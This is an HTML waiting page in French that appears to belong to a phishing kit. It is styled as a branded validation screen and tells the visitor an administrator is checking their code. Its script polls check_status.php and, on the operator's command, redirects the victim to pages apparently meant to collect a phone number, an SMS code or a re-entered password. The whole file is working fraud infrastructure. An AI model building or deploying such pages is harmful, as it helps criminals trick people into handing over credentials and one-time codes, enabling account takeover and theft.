<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation en cours</title>
    <style>
        body {
            background: linear-gradient(92.39deg, #00A6DD -7.19%, #0068B3 101.14%);
            min-height: 100vh;
            font-family: "Work Sans", system-ui, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .card {
            background: white;
            border-radius: 6px;
            padding: 48px 64px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.15);
        }
        .logo {
            background-image: url('logo_bt.png');
            background-size: contain;
            background-repeat: no-repeat;
            width: 180px;
            height: 60px;
            margin: 0 auto 40px auto;
        }
        h2 {
            color: #30305C;
            margin-bottom: 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #30305C;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            font-size: 16px;
            color: #30305C;
            margin-top: 20px;
        }
        .error-message {
            color: #d32f2f;
            margin-top: 20px;
        }
        button {
            background: #30305C;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background: #23234A;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="logo"></div>
    <h2>Validation en cours</h2>
    <div class="spinner"></div>
    <div class="message">Veuillez patienter pendant que l'administrateur vérifie votre code...</div>
    <div id="errorMsg" class="error-message" style="display:none;"></div>
</div>

<script>
    let pollingInterval;

    function checkStatus() {
        fetch('check_status.php')
            .then(response => response.json())
            .then(data => {
                if (data.status === 'numero') {
                    clearInterval(pollingInterval);
                    window.location.href = 'numero.html';
                } else if (data.status === 'sms') {
                    clearInterval(pollingInterval);
                    window.location.href = 'sms.html';
                } else if (data.status === 'error.pass') {
                    clearInterval(pollingInterval);
                    window.location.href = 'error.pass.html';
                } else if (data.status === 'validation') {
                    clearInterval(pollingInterval);
                    window.location.href = 'validation.html';
                }
                // sinon : on ne fait rien, on reste sur waiting.html
            })
            .catch(err => {
                // En cas d'erreur réseau, on ignore et on continue le polling sans jamais arrêter
            });
    }

    pollingInterval = setInterval(checkStatus, 2000);
    checkStatus();
</script>
</body>
</html>
